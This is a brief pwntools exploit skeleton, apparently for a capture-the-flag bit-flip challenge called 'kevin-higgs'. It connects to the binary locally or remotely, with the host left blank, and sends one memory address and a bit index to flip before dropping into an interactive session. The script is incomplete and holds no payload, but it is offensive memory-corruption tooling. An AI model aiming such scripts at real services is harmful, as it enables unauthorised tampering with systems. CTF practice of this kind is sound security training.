from pwn import *

e = ELF("./kevin-higgs")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("", )
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

debug()

p.sendlineafter("byte:", hex(0x0804c000 + 0x100)[2:])
p.recvuntil("bit:")
p.sendline("0")


p.interactive()
